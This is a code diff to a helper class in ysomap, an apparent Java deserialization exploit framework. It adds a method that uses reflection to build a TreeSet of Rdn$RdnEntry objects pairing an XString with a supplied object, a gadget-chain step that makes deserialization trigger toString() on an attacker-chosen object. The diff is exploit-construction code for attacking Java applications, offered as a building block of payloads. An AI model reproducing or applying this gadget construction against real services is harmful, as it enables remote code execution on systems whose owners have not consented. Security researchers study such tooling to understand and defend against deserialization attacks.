@@ -1,6 +1,7 @@
 package ysomap.core.util;
 
 import com.sun.org.apache.bcel.internal.classfile.Utility;
+import com.sun.org.apache.xpath.internal.objects.XString;
 import org.apache.shiro.subject.SimplePrincipalCollection;
 import ysomap.common.exception.GenerateErrorException;
 import ysomap.core.ObjectGadget;
@@ -90,6 +91,18 @@ public class PayloadHelper {
         TreeSet set = new TreeSet();
         ReflectionHelper.setFieldValue(set, "m", m);
         return set;
+    }
+
+    public static Object makeTreeSetWithXString(Object obj) throws Exception {
+        Object rdnEntry1 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
+        ReflectionHelper.setFieldValue(rdnEntry1, "type", "ysomap");
+        ReflectionHelper.setFieldValue(rdnEntry1, "value", new XString("test"));
+
+        Object rdnEntry2 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
+        ReflectionHelper.setFieldValue(rdnEntry2, "type", "ysomap");
+        ReflectionHelper.setFieldValue(rdnEntry2, "value", obj);
+
+        return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);
     }
 
     public static String defaultTestCommand(){
